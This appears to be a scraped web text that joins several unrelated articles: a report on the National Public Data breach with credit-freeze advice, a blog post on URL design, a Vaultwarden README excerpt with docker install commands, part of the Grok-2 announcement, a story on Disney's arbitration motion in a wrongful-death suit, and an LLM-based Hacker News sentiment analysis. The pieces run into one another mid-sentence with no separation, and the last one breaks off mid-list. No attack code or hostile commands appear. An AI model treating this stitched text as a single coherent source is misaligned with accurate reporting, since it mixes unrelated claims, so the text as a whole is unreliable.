<div id="readability-page-1" class="page"><div><p>Several months after a hacking group claimed to be selling nearly 3 billion records stolen from a prominent data broker, much of the information appears to have been leaked on a forum. According to <a data-i13n="cpos:1;pos:1" href="https://www.bleepingcomputer.com/news/security/hackers-leak-27-billion-data-records-with-social-security-numbers/" rel="nofollow noopener" target="_blank" data-ylk="slk:Bleeping Computer;cpos:1;pos:1;elm:context_link;itc:0;sec:content-canvas"><em>Bleeping Computer</em></a>, the data dump includes 2.7 billion records of personal info for people in the US, such as names, Social Security Numbers, potential aliases and all physical addresses they are known to have lived at.</p><p>The data, which is unencrypted, is believed to have been obtained from a broker called National Public Data. It's said that the business assembles profiles for individuals by scraping information from public sources and then sells the data for the likes of background checks and looking up criminal records. (A proposed class-action suit was <a data-i13n="cpos:2;pos:1" href="https://news.bloomberglaw.com/privacy-and-data-security/background-check-data-of-3-billion-stolen-in-breach-suit-says" rel="nofollow noopener" target="_blank" data-ylk="slk:filed;cpos:2;pos:1;elm:context_link;itc:0;sec:content-canvas">filed</a> against National Public Data over the breach earlier this month.)</p><p>In April, hacking collective USDoD attempted to sell 2.9 billion records it claimed was stolen from the company and included personal data on everyone in the US, UK and Canada. The group was looking <a data-i13n="cpos:3;pos:1" href="https://x.com/H4ckManac/status/1777246310782902686" rel="nofollow noopener" target="_blank" data-ylk="slk:for $3.5 million;cpos:3;pos:1;elm:context_link;itc:0;sec:content-canvas">for $3.5 million</a> for the whole 4TB database, but since then chunks of the data have been leaked by various entities.</p><p>Previous leaks included phone numbers and email addresses, but those reportedly weren't included in the latest and most comprehensive dump. As such, you won't be able to check whether your information has been included in this particular leak by punching your email address into <a data-i13n="cpos:4;pos:1" href="https://haveibeenpwned.com/" rel="nofollow noopener" target="_blank" data-ylk="slk:Have I Been Pwned?;cpos:4;pos:1;elm:context_link;itc:0;sec:content-canvas">Have I Been Pwned?</a></p><p>The data includes multiple records for many people, with one for each address they are known to have lived at. The dump comprises two text files that amount to a total of 277GB. It's not really possible for any independent body to confirm that the data includes records for every person in the US, but as <em>Bleeping Computer</em> points out, the breach is likely to include information on anyone who is living in the country.</p><p>The publication states that several people confirmed the information that the dump has on them and their family members (including some dead relatives) is accurate, but in other cases some SSNs were associated with the wrong individuals. <em>Bleeping Computer</em> posits that the information may have been stolen from an old backup as it doesn't include the current home address for the people whose details its reporters checked against the data.</p><p>In any case, it's worth taking some steps to protect yourself against any negative repercussions from the leak, such as fraud and identity theft. Be extra vigilant against scammers and phishing attacks that look to obtain access to your online accounts.</p><p>Keep an eye on credit reports to see if there has been any fraudulent activity on your accounts and inform credit bureaus <a data-i13n="elm:affiliate_link;sellerN:Experian;elmt:;cpos:5;pos:1" href="https://shopping.yahoo.com/rdlw?merchantId=759bd82a-f743-4b0b-91d8-ad446a0d2ec6&amp;siteId=us-engadget&amp;pageId=1p-autolink&amp;featureId=text-link&amp;merchantName=Experian&amp;custData=eyJzb3VyY2VOYW1lIjoiV2ViLURlc2t0b3AtVmVyaXpvbiIsImxhbmRpbmdVcmwiOiJodHRwczovL3d3dy5leHBlcmlhbi5jb20vZnJlZXplL2NlbnRlci5odG1sIiwiY29udGVudFV1aWQiOiI3OGU5YWQ3Yy0zOTI4LTQ1MGUtYjJmOC1lNTNmMWY2MGVmMGMiLCJvcmlnaW5hbFVybCI6Imh0dHBzOi8vd3d3LmV4cGVyaWFuLmNvbS9mcmVlemUvY2VudGVyLmh0bWwifQ&amp;signature=AQAAAXpWrdlgzbftNpnS9d44Qr19yfYTIhaKb71MYEqIJXLh&amp;gcReferrer=https%3A%2F%2Fwww.experian.com%2Ffreeze%2Fcenter.html" rel="nofollow noopener" target="_blank" data-ylk="slk:Experian;elm:affiliate_link;sellerN:Experian;elmt:;cpos:5;pos:1;itc:0;sec:content-canvas">Experian</a>,<a data-i13n="cpos:6;pos:1" href="https://www.equifax.com/personal/credit-report-services/credit-freeze/" rel="nofollow noopener" target="_blank" data-ylk="slk:Equifax;cpos:6;pos:1;elm:context_link;itc:0;sec:content-canvas"> Equifax</a> and<a data-i13n="elm:affiliate_link;sellerN:TransUnion;elmt:;cpos:7;pos:1" href="https://shopping.yahoo.com/rdlw?merchantId=3ac38c55-e0c9-42ec-92cc-7cff5ea0e351&amp;siteId=us-engadget&amp;pageId=1p-autolink&amp;featureId=text-link&amp;merchantName=TransUnion&amp;custData=eyJzb3VyY2VOYW1lIjoiV2ViLURlc2t0b3AtVmVyaXpvbiIsImxhbmRpbmdVcmwiOiJodHRwczovL3d3dy50cmFuc3VuaW9uLmNvbS9jcmVkaXQtZnJlZXplIiwiY29udGVudFV1aWQiOiI3OGU5YWQ3Yy0zOTI4LTQ1MGUtYjJmOC1lNTNmMWY2MGVmMGMiLCJvcmlnaW5hbFVybCI6Imh0dHBzOi8vd3d3LnRyYW5zdW5pb24uY29tL2NyZWRpdC1mcmVlemUifQ&amp;signature=AQAAAU-aMKxlUrwwcH5b5ZhDK4znS2Y1TF7B3Gt_6z9UXcaS&amp;gcReferrer=https%3A%2F%2Fwww.transunion.com%2Fcredit-freeze" rel="nofollow noopener" target="_blank" data-ylk="slk:TransUnion;elm:affiliate_link;sellerN:TransUnion;elmt:;cpos:7;pos:1;itc:0;sec:content-canvas"> TransUnion</a> if so.

            <description><![CDATA[<p>URL: <a href="https://blog.jim-nielsen.com/2023/examples-of-great-urls/">https://blog.jim-nielsen.com/2023/examples-of-great-urls/</a>, See on <a href="https://news.ycombinator.com/item?id=41243992">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          
          <p>Here’s Kyle Aster on why <a href="https://warpspire.com/posts/url-design/">thoughtful URL design is important (in 2010)</a>:</p>
<blockquote>
<p>URLs are universal. They work in Firefox, Chrome, Safari, Internet Explorer, cURL, wget, your iPhone, Android and even written down on sticky notes. They are the one universal syntax of the web. Don’t take that for granted.</p>
</blockquote>
<p>I love this reminder of the ubiquity of URLs. They’re not just for typing into browser bars. They’re used in a plethora of ways:</p>
<ul>
<li>As targets for scripting and scraping and other programmatic data retrieval.</li>
<li>As references, printed in the footnotes and appendixes of physical books.</li>
<li>As actionable triggers accessible via physical mediums, e.g. scannable QR codes or IoT device buttons.</li>
<li>And more!</li>
</ul>
<p>When I reflect on examples of great URL design<sup id="fnref:1"><a href="#fn:1">[1]</a></sup> I’ve encountered through the years — URLs that, when I saw them, I paused and thought “Wow, that’s really neat!” — these are a few that come to mind.</p>
<h2 id="stackoverflow">StackOverflow</h2>
<p>StackOverflow was the first place I remember encountering URLs that struck a nice balance between the needs of computers and humans.</p>
<p>The URLs follow a pattern like this:</p>
<p><code>/questions/:id/:slug</code></p>
<p><code>:id</code> is a unique identifier for the question that reveals nothing about the content. <code>:slug</code>, on the other hand, is a human-readable paraphrasing of the question that allows you to understand the question without ever actually going to the website.</p>
<p>The beauty is <code>:slug</code> is an optional parameter in the URL. For example:</p>
<p><a href="https://stackoverflow.com/questions/16245767">stackoverflow.com/questions/16245767</a></p>
<p>Tells you nothing about the question being asked but it’s a valid URL that allows a server to easily find and serve that unique piece of content.</p>
<p>But StackOverflow also supports the <code>:slug</code> part of the URL which allows humans to quickly understand the contents living at that URL.</p>
<p><a href="https://stackoverflow.com/questions/16245767/creating-a-blob-from-a-base64-string-in-javascript/">stackoverflow.com/questions/16245767/creating-a-blob-from-a-base64-string-in-javascript/</a></p>
<p>As noted, the <code>:slug</code> is optional. It is not required by the server to find and serve the contents in question. In fact, it can easily be changed over time without without breaking the URL (which I find quite elegant).</p>
<p>Granted, it can also be used deceptively. For example, this is the same URL as above but it portends completely different contents (without breaking the link):</p>
<p><a href="https://stackoverflow.com/questions/16245767/how-to-bake-a-cake">stackoverflow.com/questions/16245767/how-to-bake-a-cake</a></p>
<p>But hey, trade-offs in everything.</p>
<h2 id="slack">Slack</h2>
<p>I remember when Slack launched a marketing campaign to educate people about the product. They used the language of the marketing campaign – <a href="http://web.archive.org/web/20140212215308/slack.com/is">“Slack is...”</a> — in the page copy as well as in the URLs, e.g.</p>
<ul>
<li><code>slack.com/is</code></li>
<li><code>slack.com/is/team-communication</code></li>
<li><code>slack.com/is/everything-in-one-place</code></li>
<li><code>slack.com/is/wherever-you-are</code></li>
</ul>
<p>I remember being so intrigued at this effort to bring the design of the story-telling campaign all the way up into the URLs themselves.</p>
<p>Since then, I’ve always found delight in URLs that try to form natural languages sentences — <code>slack.com/is/team-communication</code> — rather than concatenate a series of hierarchical keywords — <code>slack.com/product/team-communication</code>.</p>
<p>Speaking of doing fun things with sentence structure in your URLs...</p>
<h2 id="jessica-hische">Jessica Hische</h2>
<p>Jessica Hische has her website under a <code>.is</code> domain (which is <a href="https://en.wikipedia.org/wiki/.is">for Iceland</a>, apparently).</p>
<p><a href="https://www.jessicahische.is/">jessicahische.is</a></p>
<p>She riffs on this fun third-person form of “I am” across her site. For example, click on “About” in the primary navigation and it takes you to:</p>
<p><a href="https://www.jessicahische.is/anoversharer">jessicahische.is/anoversharer</a></p>
<p>That’s fun! <code>mydomain.com/about</code> is clear too, but I love the whimsy of describing the “about” and doing it in sentence structure.</p>
<p>All of the nouns in her primary navigation follow this pattern, as well as her individual pieces of work. Like this writeup about one of her holiday culinary packaging gigs has the URL:</p>
<p><a href="https://www.jessicahische.is/sofulloffancypopcorn">jessicahische.is/sofulloffancypopcorn</a></p>
<p>Fun!</p>
<h2 id="urls-as-product">URLs as Product</h2>
<p>I’ve always loved services whose URLs map nicely to their domain semantics. For example, <a href="https://www.quora.com/Which-sites-have-the-best-URL-design/answer/Simon-Willison">GitHub’s URLs map really well to git semantics</a> like the three dot diff comparison in git:</p>
<p><code>/:owner/:project/compare/ref1...ref2</code></p>
<p>e.g.</p>
<p><a href="https://github.com/django/django/compare/4.2.7...main">github.com/django/django/compare/4.2.7...main</a></p>
<p>For technical products, this ability to navigate a website without necessarily seeing the user interface is a cool superpower.</p>
<p>NPM is somewhat similar. Want to see <code>react-router</code> on NPM? You don’t have to go to NPM’s home page and click around or use their search box. Once you become familiar with their site structure, you know you can lookup a package using:</p>
<p><code>/package/:package-name</code></p>
<p>e.g.</p>
<p><a href="https://www.npmjs.com/package/react-router">npmjs.com/package/react-router</a></p>
<p>Want to lookup a specific version of a package?</p>
<p><code>/package/:package-name/v/:semver</code></p>
<p>e.g.</p>
<p><a href="https://www.npmjs.com/package/react-router/v/5.3.4">npmjs.com/package/react-router/v/5.3.4</a></p>
<p>These kinds of shortcuts are super useful when you’re using a particular product. In the case of NPM, you’re hunting through your <code>package.json</code> and need to lookup some details of a specific package pinned at a specific version, you can navigate to NPM’s details of that package by merely identifying the version you want and typing the details into a URL bar.</p>
<p>NPM CDNs <a href="https://unpkg.com/">like unpkg</a> do a good job at following these semantics as well. Want a file from a published package? The homepage of unpkg says:</p>
<p><code>unpkg.com/:package@:version/:file</code></p>
<p>In cases like this, <em>the URL can be the product itself</em> which makes its design all the more vital<sup id="fnref:2"><a href="#fn:2">[2]</a></sup>.</p>
<h2 id="whats-yours">What’s Yours?</h2>
<p>These are a few examples of URLs I’ve enjoyed using or seeing over the years. I’m sure there are others, but I’d be curious to know what your favorites are? Blog ’em!</p>

<p dir="auto">Basically full implementation of Bitwarden API is provided including:</p>
<ul dir="auto">
<li>Organizations support</li>
<li>Attachments and Send</li>
<li>Vault API support</li>
<li>Serving the static files for Vault interface</li>
<li>Website icons API</li>
<li>Authenticator and U2F support</li>
<li>YubiKey and Duo support</li>
<li>Emergency Access</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">Pull the docker image and mount a volume from the host for persistent storage:</p>
<div dir="auto" data-snippet-clipboard-copy-content="docker pull vaultwarden/server:latest
docker run -d --name vaultwarden -v /vw-data/:/data/ --restart unless-stopped -p 80:80 vaultwarden/server:latest"><pre>docker pull vaultwarden/server:latest
docker run -d --name vaultwarden -v /vw-data/:/data/ --restart unless-stopped -p 80:80 vaultwarden/server:latest</pre></div>
<p dir="auto">This will preserve any persistent data under /vw-data/, you can adapt the path to whatever suits you.</p>
<p dir="auto"><strong>IMPORTANT</strong>: Most modern web browsers disallow the use of Web Crypto APIs in insecure contexts. In this case, you might get an error like <code>Cannot read property 'importKey'</code>. To solve this problem, you need to access the web vault via HTTPS or localhost.</p>
<p dir="auto">This can be configured in <a href="https://github.com/dani-garcia/vaultwarden/wiki/Enabling-HTTPS">vaultwarden directly</a> or using a third-party reverse proxy (<a href="https://github.com/dani-garcia/vaultwarden/wiki/Proxy-examples">some examples</a>).</p>
<p dir="auto">If you have an available domain name, you can get HTTPS certificates with <a href="https://letsencrypt.org/" rel="nofollow">Let's Encrypt</a>, or you can generate self-signed certificates with utilities like <a href="https://github.com/FiloSottile/mkcert">mkcert</a>. Some proxies automatically do this step, like Caddy (see examples linked above).</p>

At the same time, we are introducing Grok-2 mini, a small but capable sibling of Grok-2. An early version of Grok-2 has been tested on the LMSYS leaderboard under the name "sus-column-r." At the time of this blog post, it is outperforming both Claude 3.5 Sonnet and GPT-4-Turbo.</strong></p><p>Grok-2 and Grok-2 mini are currently in beta on 𝕏, and we are also making both models available through our enterprise API later this month.</p><h3 id="grok-2-language-model-and-chat-capabilities">Grok-2 language model and chat capabilities</h3><p>We introduced an early version of Grok-2 under the name "sus-column-r" into the LMSYS chatbot arena, a popular competitive language model benchmark. It outperforms both Claude and GPT-4 on the LMSYS leaderboard in terms of its overall Elo score.</p></div>

<div><p>Internally, we employ a comparable process to evaluate our models. Our AI Tutors engage with our models across a variety of tasks that reflect real-world interactions with Grok. During each interaction, the AI Tutors are presented with two responses generated by Grok. They select the superior response based on specific criteria outlined in our guidelines. We focused on evaluating model capabilities in two key areas: following instructions and providing accurate, factual information. Grok-2 has shown significant improvements in reasoning with retrieved content and in its tool use capabilities, such as correctly identifying missing information, reasoning through sequences of events, and discarding irrelevant posts.</p><h2 id="benchmarks">Benchmarks</h2><p>We evaluated the Grok-2 models across a series of academic benchmarks that included reasoning, reading comprehension, math, science, and coding. Both Grok-2 and Grok-2 mini demonstrate significant improvements over our previous Grok-1.5 model. They achieve performance levels competitive to other frontier models in areas such as graduate-level science knowledge (GPQA), general knowledge (MMLU, MMLU-Pro), and math competition problems (MATH). Additionally, Grok-2 excels in vision-based tasks, delivering state-of-the-art performance in visual math reasoning (MathVista) and in document-based question answering (DocVQA).</p></div>

She ordered and ate the “Sure I’m Frittered” vegetarian broccoli and corn fritters, the “Scallop Forest” sea scallops appetizer, the “This Shepherd Went Vegan” entree, and a side of onion rings.</p><p>After their meal, Piccolo returned to their hotel room, and Tangsuan and her mother-in-law continued to shop at Disney Springs. later that evening, Tangsuan had an acute allergic reaction in Planet Hollywood, self-administered an EpiPen, and was transported to a local hospital, where she later died.</p><div><figure><a data-fslightbox="1" data-type="image" aria-label="Open fullscreen lightbox with current image" href="https://media.wdwnt.com/2024/03/disney-plus-logo-march-2024-1200x675.jpeg"><img decoding="async" width="1200" height="675" src="https://media.wdwnt.com/2024/03/disney-plus-logo-march-2024-1200x675.jpeg" alt="New Hulu on Disney+ logo" title="Disney Seeking Dismissal of Raglan Road Death Lawsuit Because Victim Was Disney+ Subscriber 2" data-eio="l" data-old-src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABLAAAAKjAQAAAAAlyMttAAAAAnRSTlMAAHaTzTgAAAB5SURBVHja7cExAQAAAMKg9U/tbQegAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAM440AAFaumxcAAAAAElFTkSuQmCC" data-src="https://media.wdwnt.com/2024/03/disney-plus-logo-march-2024-1200x675.jpeg"></a></figure></div><p>In the latest update for the Disney Springs wrongful death lawsuit, Disney cited legal language within the terms and conditions for Disney+, which “requires users to arbitrate all disputes with the company.” Disney claims Piccolo reportedly agreed to this in 2019 when signing up for a one-month free trial of the streaming service on his PlayStation console.</p><p>In the May 31 motion filed to move the wrongful death lawsuit to arbitration, Disney attorneys said that the Disney+ subscriber agreement states that any dispute, except for small claims, “must be resolved by individual binding arbitration.” Disney says that similar language was agreed to by Piccolo when he used the My Disney Experience app to purchase tickets to visit EPCOT at Walt Disney World in September 2023. Tangsuan died before she and Piccolo could use the tickets.</p><p>“Whether Piccolo actually reviewed the Disney terms is also immaterial,” the motion says.</p><p>Arbitration is defined by the Legal Information Institute as “an alternative dispute resolution method where the parties in dispute agree to have their case heard by a qualified arbitrator out of court.”</p><p>Attorneys for Piccolo called Disney’s latest motion “preposterous,” and that it’s “‘absurd’ to believe that the 153 million subscribers to the popular streaming service have waived all claims against the company and its affiliates because of language ‘buried’ within the terms and conditions,” according to Newsday.</p><blockquote><p>The notion that terns agreed to by a consumer when creating a Disney+ free trial account would forever bar that consumer’s right to a jury trial in any dispute with any Disney affiliate or subsidiary, is so outrageously unreasonable and unfair as to shock the judicial conscience, and this court should not enforce such an agreement.</p><cite>Brian Denny, Piccolo’s West Palm Beach attorney in a filing on August 2, 2024</cite></blockquote><p>In that same August 2 filing, attorneys for Piccolo cite that Piccolo is serving as a plaintiff in this case on behalf of his wife and her estate, not as an individual, and that his wife’s estate did not exist at the time of him signing up for a free trial of Disney+. Piccolo’s attorneys claim that Disney is “attempting to enforce an agreement that it never signed against a party who also never signed.”</p><p>“This argument borders on the surreal,” said Piccolo’s attorneys in the filing.</p><p>Walt Disney Parks and Resorts and their attorneys declined Newsday’s request for comment.</p><p>For the latest Disney Parks news and info, follow <a href="https://wdwnt.com/">WDW News Today</a> on&nbsp;<a href="https://twitter.com/wdwnt" target="_blank" rel="noopener">Twitter</a>,&nbsp;<a href="https://www.facebook.com/WDWNewsToday/" target="_blank" rel="noopener">Facebook</a>, and&nbsp;<a href="https://www.instagram.com/wdwnt/" target="_blank" rel="noopener">Instagram</a>.</p><div><h3>Related posts:</h3></div>

<div id="readability-page-1" class="page"><div id="post-content" itemprop="articleBody"><hr><p><strong>tl;dr</strong>
We analyzed all Hacker News posts with more than five comments between January 2020 and June 2023.
Leveraging LLama3 70B LLM, we examined both the posts and their associated comments to gain insights
into how the Hacker News community engages with different topics. You can download the datasets
we produced at the bottom of the article.</p><p>Use the tool below to explore various topics and the sentiments they evoke. The sentiment column
reports the median sentiment score, 0 being the most negative sentiment and 9 the most positive.
Click on the column headers to discover topics that inspire strong reactions, whether positive or
negative, and to identify divisive subjects that tend to generate polarized commentary.</p><h2 id="motivation">Motivation<a href="#motivation" aria-label="Direct link to Motivation" title="Direct link to Motivation">​</a></h2><p>If you have been following Hacker News for a while, you have likely developed an intuition
for the topics that the community loves - and topics the community loves to hate.
If you port <strong>Factorio</strong> to run on <strong>ZX Spectrum</strong> using <strong>Rust</strong>, you will be overwhelmed
with love and karma. On the other hand, you better don an asbestos suit if, instead
of raising a <strong>funding round</strong>, you sell your startup to a <strong>private equity</strong> company
so they can add <strong>telemetry</strong> in the codebase to power <strong>targeted ads</strong>.</p><p>But that's just a hazy intuition! Since the community is a big believer in <strong>rationality</strong>
and <strong>data science</strong> (the phrase is divisive though), we would be in a stronger position
if we could back our hunch with proper <strong>data analysis</strong>.</p><p>Also, it would give us an excuse to play with <strong>large language models</strong> which, all the
<strong>AI hype</strong> aside, are mind-blowingly effective at practical tasks like this. And,
we happen to be developers of an <strong>open source</strong> tool,
<a href="https://github.com/netflix/metaflow" target="_blank" rel="noopener noreferrer">Metaflow</a>, written in <strong>Python</strong>,
which makes it <strong>fun</strong> and <strong>educational</strong> to <strong>hack</strong> projects like this.</p><p>Type the bolded phrases in the textbox above to see if we are optimizing for an
appropriate <strong>emotional response</strong>. </p><h2 id="what-topics-trend-on-hacker-news">What topics trend on Hacker News?<a href="#what-topics-trend-on-hacker-news" aria-label="Direct link to What topics trend on Hacker News?" title="Direct link to What topics trend on Hacker News?">​</a></h2><p>As described in the implementation section below, we downloaded about 100,000 pages posted
on Hacker News to understand what content resonates with the community. We focus on posts
that gained at least 20 upvotes and 5 comments, prompting a large language model to come
up with ten phrases that best describe each page.</p><p>Here are the top 20 topics, aggregated from the 100,000 pages, along with the number of
posts covering each topic:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/top_topics-f47d2ee20906766a39ed8fdb2908c264.png" width="1295" height="1033"></p><p>The top topics are hardly surprising. However, the community is known for having
diverse intellectual interests. The top 20 topics represent only 10% of the topics
covered across posts. You can see this by yourself by using the tool above that
cover all the 14,000 topics that are associated with at least five posts.</p><p>Have the top topics evolved over time? You bet. Here are the top-10 trending
topics:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/growing_topics-955fdd56864b7346df6f39888123e4a4.png" width="1410" height="1019"></p><p>Even though the dataset only extends to June 2023, we can see a tsunami
of AI, natural language processing, and related topics. Sadly, layoffs started
trending mid-2022 as well. The rise of AI articles likely explains the growth
in the Technology topic as well.</p><h2 id="whats-declining">What's declining<a href="#whats-declining" aria-label="Direct link to What's declining" title="Direct link to What's declining">​</a></h2><p>In 2020-2022, an overwhelming macro-trend was everything related
to the COVID pandemic which fortunately is not a pressing issue
anymore. Fascinatingly, August 2021 was a tumultuous month with especially
<a href="https://www.wired.com/story/apple-photo-scanning-csam-communication-safety-messages/" target="_blank" rel="noopener noreferrer">Apple's proposed CSAM
scanning</a>
causing an uproar in posts related to Privacy and Apple.</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/declining_topics-fded256187c75900d3f7871a9acae077.png" width="1471" height="1048"></p><p>If you want to take a trip down the memory lane, consider the past
topics on the left which haven't been covered once since January 2022:</p><table><thead><tr><th>Before Jan 2022 📉</th><th>After Jan 2022 📈</th></tr></thead><tbody><tr><td>George Floyd</td><td>GPT-4</td></tr><tr><td>Herd immunity</td><td>Stable Diffusion</td></tr><tr><td>Antibodies</td><td>Russia-Ukraine War</td></tr><tr><td>IOS 14</td><td>Ventura</td></tr><tr><td>Freenode</td><td>Bank Failure</td></tr><tr><td>Suez Canal</td><td>Midjourney</td></tr><tr><td>Wallstreetbets</td><td>Hiring Freeze</td></tr><tr><td>Hydroxychloroquine</td><td>FIDO Alliance</td></tr><tr><td>Infection rates</td><td>Cost of living crisis</td></tr></tbody></table><p>Correspondingly, the topics on the right didn't exist before
January 2022. It doesn't take a PhD in Economics to understand how
<em>Wallstreetbets</em> got replaced by <em>Cost of living crisis</em>,
<em>Hiring freeze</em>, and <em>Bank failure</em>.</p><h2 id="but-how-do-people-feel-about-these-topics">But how do people <em>feel</em> about these topics<a href="#but-how-do-people-feel-about-these-topics" aria-label="Direct link to but-how-do-people-feel-about-these-topics" title="Direct link to but-how-do-people-feel-about-these-topics">​</a></h2><p>Importantly, sharing or upvoting a post doesn't imply endorsement - <a href="https://xkcd.com/386/" target="_blank" rel="noopener noreferrer">often the opposite</a>. Hence
to truly understand the dynamics of a community, we need to analyze how people react to posts, as expressed
through their comments.</p><p>To do this, we reconstructed comment threads associated with the posts in the dataset and asked
an LLM to classify the sentiment of the discourse between 0 and 9, zero being an all-out flamewar
and nine indicating a perfect harmony and positivity.</p><p>Our dutiful LLM took the job as a virtual community moderator and went through 100k comment threads in
about 9 hours, reading through 230M words consisting of the full emotional gamut of bitterness,
passion, wisdom, humor, and love.</p><p>Here's what the LLM came back with in terms of the distribution of sentiments:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/sentiment-distribution-da1bd4c602de66b6f1ef68cb3434a4f8.png" width="721" height="399"></p><p>Firstly, the LLM is utterly befuddled about what a neutral discussion looks like - there are no 5 in the results.
Or, maybe this is a snarky note by the LLM noting that humans are incapable of unemotional, unbiased discourse.</p><p>Secondly, the sentiments are clearly skewed
towards the positive side, which aligns with our personal experience with the site. The bias to
positivity and optimism is a key reason why we open Hacker News daily. There's enough vitriol elsewhere.</p><p>It is also worth noting that at least some of the few ones assigned by the machine seem to be bogus.
For instance, <a href="https://news.ycombinator.com/item?id=32088537" target="_blank" rel="noopener noreferrer">this post by BentoML</a> was given a score of one,
although the sentiment seems majorly positive and supportive. All the usual caveats about LLMs apply.</p><p>Now with the topics and the sentiment scores at hand, we can finally give a scientific answer to the question of
what the community loves and loves to hate:</p><table><thead><tr><th>Love 😍</th><th>Hate 😠</th></tr></thead><tbody><tr><td>Programming</td><td>FTX</td></tr><tr><td>Computer Science</td><td>Police Misconduct</td></tr><tr><td>Open Source</td><td>Sam Bankman-Fried</td></tr><tr><td>Python</td><td>Xinjiang</td></tr><tr><td>Game Development</td><td>Torture</td></tr><tr><td>Rust</td><td>Employee Monitoring</td></tr><tr><td>Electronics</td><td>Cost Cutting</td></tr><tr><td>Mathematics</td><td>Racial Profiling</td></tr><tr><td>Functional Programming</td><td>Online Safety Bill</td></tr><tr><td>Programming Language</td><td>War on Terror</td></tr><tr><td>Physics</td><td>Atlassian</td></tr><tr><td>Embedded Systems</td><td>CSAM</td></tr><tr><td>Self Improvement</td><td>NYPD</td></tr><tr><td>Database</td><td>Alameda Research</td></tr><tr><td>Unix</td><td>International Students</td></tr><tr><td>Astronomy</td><td>TSA</td></tr><tr><td>Retro Computing</td><td>Earn It Act</td></tr><tr><td>Nostalgia</td><td>Car Features</td></tr><tr><td>Debugging</td><td>Bloatware</td></tr></tbody></table><p>Geeks, nerds, and hackers should find themselves right at home! Interestingly, while the community tends to be
visionary and forward-looking (with technical matters at least), it definitely has a soft spot for (technical) nostalgia.
While the modern world is amazing, we miss ZX Spectrum, Z80 assembly, and 8086 dearly. At least we find some
comfort in PICO-8.</p><p>On the anger-inducing side, most topics need no explanation. It is worth clarifying though that Hacker News does not
hate International Students, but the posts related to them tend to be overwhelmingly negative,
reflecting the community’s sympathy for the challenges faced by those studying abroad.</p><p>Comically, Hacker News is not a community of car lovers. When we talk about cars, it is because there's
something wrong with them. For more insights like this, use the tool at the top of the page to explore
the diverse landscape of HN topics in detail.</p><h2 id="some-topics-are-just-divisive">Some topics are just divisive<a href="#some-topics-are-just-divisive" aria-label="Direct link to Some topics are just divisive" title="Direct link to Some topics are just divisive">​</a></h2><p>Besides topics being unimodally love or hate-inducing, some topics are bimodal: Sometimes
a post about the topic generates a highly positive response, other times a flamewar. Examples include</p><ul><li><strong>GNOME</strong> - <a href="https://www.mayrhofer.eu.org/post/kde-vs-gnome/" target="_blank" rel="noopener noreferrer">KDE vs. GNOME</a> - the war has been raging for 25 years.</li><li><strong>Google</strong> - a dominant force in the Internet, both in good and bad.</li><li><strong>Government regulations</strong> - damned if you do and damned if you don't.</li><li><strong>Venture capital</strong> - the lifeblood of Silicon Valley and a source of endless gossip.</li></ul><p>See more by sorting by the <code>divisive</code> column in the tool above. To rank highly by the divisiveness
score, the topic must be associated with both negative and positive posts equally
and not many neutral ones.</p><h2 id="is-the-mood-improving">Is the mood improving?<a href="#is-the-mood-improving" aria-label="Direct link to Is the mood improving?" title="Direct link to Is the mood improving?">​</a></h2><p><em>Cue <a href="https://en.wikipedia.org/wiki/Betteridge%27s_law_of_headlines" target="_blank" rel="noopener noreferrer">Betteridge's Law</a></em>.</p><p>We can plot the average sentiment over time, as expressed in daily comment threads:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/sentiment-over-time-97569616155ec98e8d15c008b62591bc.png" width="1147" height="818"></p><p>The data proves that things sucked in August 2021 (or maybe it was just the Apple debacle highlighted
in the chart above). Overall, there's a clear but modest downward trend in the average sentiment.</p><p>It
would require a deeper analysis to understand why this is the case. Putting aside an obvious hypothesis
that life is just getting worse (which <a href="https://en.wikipedia.org/wiki/Factfulness" target="_blank" rel="noopener noreferrer">might not be true</a>),
an alternative hypothesis may be a variant of
<a href="https://en.wikipedia.org/wiki/Eternal_September" target="_blank" rel="noopener noreferrer">Eternal September</a>. It takes conscious and tireless
effort to maintain a positive mood in a growing community. Kudos to HN moderators for keeping the
community thriving and positive over the years!</p><h2 id="implementation">Implementation<a href="#implementation" aria-label="Direct link to Implementation" title="Direct link to Implementation">​</a></h2><p>A reason to be excited and optimistic about the future is the very existence of this article.
While natural language processing and sentiment analysis have been around for decades,
the quality, versatility, and the ease of use afforded by LLMs is absolutely unprecedented.</p><p>Attaining the quality
of topics and sentiment scores with a messy dataset like the one here would have required a PhD-thesis
level of effort just a few years ago - and very likely the results would have been worse. In contrast,
we developed all the code for this article in about seven hours. Processing 350M tokens with just
a decent-sized model would have required a supercomputer a decade ago, whereas in our case it took about 16 hours
using widely available hardware.</p><p>Most amazingly, all the building blocks, LLMs included, are available in open source! Let's do a
quick overview (with code and data), showing how you can repeat the experiment at home.</p><p>Here's what we did at the high level:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/hacker-news-architecture-cec4efca1150350d4bb35ac06dfb7761.png" width="1920" height="1080"></p><p>Each white box in the picture is <a href="https://docs.metaflow.org/" target="_blank" rel="noopener noreferrer">a Metaflow flow</a>, linked below:</p><ol><li><a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hninit.py" target="_blank" rel="noopener noreferrer"><code>HNSentimentInit</code></a> creates a list of posts to analyze.</li><li><a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hncrawl.py" target="_blank" rel="noopener noreferrer"><code>HNSentimentCrawl</code></a> downloads the posts.</li><li><a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hnposts.py" target="_blank" rel="noopener noreferrer"><code>HNSentimentAnalyzePosts</code></a> parses the posts and runs them through an LLM.</li><li><a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hncomments.py" target="_blank" rel="noopener noreferrer"><code>HNSentimentCommentData</code></a> reconstructs comment threads based on <a href="https://console.cloud.google.com/marketplace/product/y-combinator/hacker-news" target="_blank" rel="noopener noreferrer">a Hacker News dataset in Google BigQuery</a>.

